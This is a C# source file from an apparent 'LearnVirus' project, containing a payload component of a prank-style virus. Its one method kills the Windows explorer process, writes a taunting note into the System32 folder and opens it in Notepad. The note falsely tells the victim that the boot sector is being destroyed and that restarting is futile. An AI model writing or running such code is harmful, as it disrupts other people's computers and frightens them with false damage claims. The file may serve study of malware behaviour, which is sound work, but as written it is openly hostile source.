using System;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;

namespace LearnVirus.Virus
{
    public class NotepadText
    {
        public static void ShowNotepad()
        {
            string infotext = String.Join(
                Environment.NewLine,
                "Thank you " + Environment.UserName + " for your collaboration in destroying your computer.",
                "",
                "Your part is done now. And your computer is now infected by the best virus of all-time.",
                "Oh, forgot to tell you don't even try to taskkill this process or restart your PC.",
                "As... it's already to late. You installed pirated software and now the Windows boot sector want a break.",
                "",
                "But, Good luck saving your computer",
                "/Hacker. 76");
            Process[] proc = Process.GetProcessesByName("explorer");
            proc[0].Kill();
            System.IO.File.WriteAllText(@"C:/Windows/System32/README", infotext);
            Process.Start("notepad.exe", @"C:/Windows/System32/README");
        }
    }
}
